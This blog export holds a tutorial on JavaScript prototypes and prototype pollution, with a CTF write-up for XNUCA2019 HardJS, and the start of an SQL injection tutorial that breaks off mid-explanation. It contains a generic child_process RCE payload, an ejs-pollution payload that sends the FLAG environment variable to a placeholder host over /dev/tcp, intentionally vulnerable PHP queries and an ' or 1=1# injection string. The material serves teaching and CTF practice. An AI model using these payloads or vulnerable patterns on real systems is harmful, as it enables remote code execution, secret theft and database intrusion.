<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br></pre></td></tr></table></figure>


<p><strong>即是函数既可以作为对象去解释又可以作为函数去解释</strong></p>
<p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个寻找到具体方法或者属性的机制。</p>
<p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>


<p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>
<p>如果希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>


<p>所以可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p>
<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>
<p><code>foo.``**proto**`` == Foo.prototype</code></p>
<p><img src="https://s2.loli.net/2022/03/15/YAlLm68IaD2PVHR.png"></p>
<p>所以，总结一下：</p>
<ol>
<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
</ol>
<h1 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h1><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
<p>比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>


<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>
<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在对象son中寻找last_name</li>
<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
</ol>
<p><img src="https://s2.loli.net/2022/03/15/rv6q7AOwld9DJYV.png"></p>
<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作<code>prototype继承链</code>。</p>
<p>以上就是最基础的JavaScript面向对象编程，并不深入研究更细节的内容，只要牢记以下几点即可：</p>
<ol>
<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
<li>JavaScript使用prototype链实现继承机制</li>
</ol>
<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>前面说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>


<p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p>
<p><img src="https://s2.loli.net/2022/03/15/L1e3BF6JDiXakdT.png"></p>
<p>原因也显而易见：因为前面修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<p>js中有个json.prase的方法,json解析的时候,会把<code>__proto__</code>变成一个键名，可以理解为和a同级,而不是一个原型的属性了，变成一个普通的属性。</p>
<p><img src="https://s2.loli.net/2022/03/15/TVdf34HI1QRkGYo.png"></p>
<p>常规Payload</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">e =&gt; &#123; <span class="keyword">for</span> (<span class="keyword">var</span> a <span class="keyword">in</span> &#123;&#125;) &#123; <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[a]; &#125; <span class="keyword">return</span> <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;uname -a&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>其他视具体情况改变。</p>
<p>一般两个函数<code>(merge，和clone)</code>可以形成攻击环境</p>
<p><code>[a.name](http://a.name)`` = a[&#39;name&#39;]</code></p>
<h1 id="XNUCA2019Qualifier-HardJS"><a href="#XNUCA2019Qualifier-HardJS" class="headerlink" title="[XNUCA2019Qualifier]HardJS"></a>[XNUCA2019Qualifier]HardJS</h1><p>这题是可以下载源码的。</p>
<p>查看ejs的源码，看到下面代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">source</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">generateSource</span>();</span><br><span class="line">  prepended += <span class="string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">    prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">    prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  appended += <span class="string">&#x27;  return __output.join(&quot;&quot;);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">source</span> = prepended + <span class="variable language_">this</span>.<span class="property">source</span> + appended;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>server.js</code>中是服务器的主要逻辑代码，可以看到其使用了<code>ejs</code>作为渲染引擎，并使用了中间件<code>body-parser</code>，通过这一行代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extend</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br></pre></td></tr></table></figure>


<p>说明服务器会接收POST传过来的json数据，而且我也知道这道题目的考察点就是原型链污染（因为就是奔着掌握这个知识点来刷题的），那么我们就可以通过这个接口传入参数到服务端了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/get&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span> ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">&quot;select count(*) count from `html` where userid= ?&quot;</span></span><br><span class="line">    <span class="comment">// var sql = &quot;select `dom` from  `html` where userid=? &quot;;</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].<span class="property">count</span> &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Merge the recorder in the database.&quot;</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `id`,`dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.<span class="property">length</span> ;i++)&#123;</span><br><span class="line">            lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">&quot;delete from `html` where id = ?&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,raws[i].<span class="property">id</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(doms);</span><br><span class="line">            res.<span class="title function_">json</span>(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Return recorder is less than 5,so return it without merge.&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.<span class="property">length</span> ; i++)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">        res.<span class="title function_">json</span>(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>分析以上代码知道，当<code>datalist</code>的长度大于5时，会执行这一条语句：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br></pre></td></tr></table></figure>


<p>然后问题就变成了怎么让<code>datalist</code> 的长度大于5，通过<code>server.js</code>定义的<code>/add</code>接口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/add&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">type</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">content</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> newContent = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span>;</span><br><span class="line"></span><br><span class="line">        newContent[req.<span class="property">body</span>.<span class="property">type</span>] = [ req.<span class="property">body</span>.<span class="property">content</span> ]</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newContent:&quot;</span>,newContent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(newContent) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(newContent);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>我们只需要构造type和content两个键值，将<code>Content-Type</code>设置为<code>application/json</code>，然后post访问该接口5次以上便可以</p>
<p>污染点找到了，接下来是如何利用原型链污染来获取Flag，这道题目有两种方式：</p>
<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><h3 id="利用ejs进行rce"><a href="#利用ejs进行rce" class="headerlink" title="利用ejs进行rce"></a>利用ejs进行rce</h3><p>因为<code>server.js</code>调用了ejs作为模板渲染引擎，经过调试跟进，可以在<code>ejs.js</code>中发现如下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">compile</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">...</span><br><span class="line">src = <span class="variable language_">this</span>.<span class="property">source</span>;</span><br><span class="line">...</span><br><span class="line">fn = <span class="keyword">new</span> <span class="title function_">ctor</span>(opts.<span class="property">localsName</span> + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line"><span class="comment">// Return a callable function which will execute the function</span></span><br></pre></td></tr></table></figure>


<p>这段代码的意思便是，<code>opt.outputFunctionName</code>会被作为字符串拼接到<code>prepended</code>中，然后到<code>src</code>、<code>fn</code>最终作为代码执行。而且<code>opt.outputFunctionName</code>这个成员在函数的上下文中完全没有出现过，也就是<code>undefined</code>那么我们通过给<code>Object.prototype</code>加上这一属性，就可以达到RCE的效果了</p>
<p>payload如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;a=1;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;b</span></span><br><span class="line"><span class="string">ash -c \&quot;echo $FLAG&gt;/dev/tcp/xxxxx/xx\&quot;&#x27;)//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>向<code>/add</code>接口POST 6次，然后再访问一次<code>/get</code>，再访问<code>/</code>或<code>/login</code>触发<code>render()</code>函数即可</p>
<p>FLAG在环境变量中</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>contaminate</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入详解2.0-重构篇</title>
    <url>/SQLInject/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A32.0-%E9%87%8D%E6%9E%84%E7%AF%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><blockquote>
<p>之前写过一篇，但是愈发感觉到之前写的薄弱和乱，所以重构！</p>
</blockquote>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownecEnPtXKhJqdw1B.jpg"></p>
<span id="more"></span>


<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><center>正文</center></h1><p>实际上注入类漏洞最<font color="red"> 本质的原因就是</font> ，<code>混淆了代码和数据的边界</code>。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownbP659ZCEGdpOSFm.png"></p>
<ul>
<li>注入的类型总的就只有3种：<ul>
<li>联合注入<ul>
<li>联合注入从类型来划分又有：<ol>
<li>数字型</li>
<li>字符型</li>
</ol>
</li>
<li>联合注入从注入点来划分又有：<ol>
<li>搜索框注入</li>
<li>HTTP头注入<ol>
<li>User-Agent注入</li>
<li>X-Forwarded-For注入</li>
<li>Cookie注入</li>
</ol>
</li>
</ol>
<ul>
<li>报错注入</li>
<li>盲注<ul>
<li>盲注从方式来划分有：<ul>
<li>时间盲注</li>
<li>布尔盲注</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a><center>联合注入</center></h1><p>由<font color="red"> union select</font>得名，是一种最快的查询方式。</p>
<p>从注入类型来划分讲。</p>
<h2 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h2><p>也就是不用闭合，用户的输入直接被解析成了新的SQL语句。</p>
<p>从代码层面来看如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id + <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>从上图可以看到<font color="red"> id是以+直接进行拼接的</font> ，这样我们就可以从直接给id，SQL语句让他直接执行以此产生SQL注入。</p>
<h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>字符型就要进行闭合，并且闭合是非常关键的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>在第8行可以清晰的看到id被单引号包围起来，如果想要响应自己想要执行的SQL语句就执行如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>


<p>因为<font color="red"> 引号的就近匹配</font> ，所以单引号会和左边最近的符号匹配。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27;;&quot;;</span></span><br></pre></td></tr></table></figure>


<p><code>&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39;</code> 此部分自成一块</p>
